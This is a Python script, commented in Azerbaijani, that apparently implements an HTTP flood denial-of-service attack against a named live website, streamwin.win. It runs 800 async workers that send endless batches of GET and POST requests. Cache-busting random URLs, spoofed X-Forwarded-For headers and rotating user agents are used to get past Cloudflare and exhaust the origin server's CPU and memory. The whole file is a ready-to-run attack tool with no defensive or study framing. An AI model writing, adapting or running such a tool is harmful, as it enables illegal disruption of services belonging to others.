import asyncio
import httpx
import random
import string
import time

# --- HƏDƏF ---
TARGET_URL = "https://streamwin.win"
# Railway üçün asinxron worker sayısı (Thread limitinə ilişmir)
WORKERS = 800 

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def terminator_strike(worker_id, client):
    while True:
        try:
            # Cloudflare-in keş (cache) sistemini darmadağın edən dinamik URL
            # Bu, sorğunu mütləq şəkildə ANA SERVERƏ (Origin) göndərməyə məcbur edir
            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(20)}&search={r_str(50)}"
            
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,6)}.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive"
            }

            # HTTP/2 MULTIPLEXING: Bir saniyədə 100 "Yaxalanmaz" packet burax!
            tasks = []
            for _ in range(100):
                # Server CPU-sunu və RAM-ını asılı saxlamaq üçün POST və GET qarışığı
                if _ % 5 == 0:
                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
                else:
                    tasks.append(client.get(url, headers=headers))
            
            # Dalğanı serverin prosessoruna çırp!
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 SINGULARITY MODE INITIALIZED: {TARGET_URL}")
    print("[!] Bypassing Cloudflare Edge... Targeting Origin Server Memory.")
    
    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # Cloudflare Bypass üçün MÜTLƏQDİR
        verify=False, 
        limits=limits, 
        timeout=10.0         # Server donanda bağlantını buraxma (Slowloris)
    ) as client:
        
        workers = [terminator_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
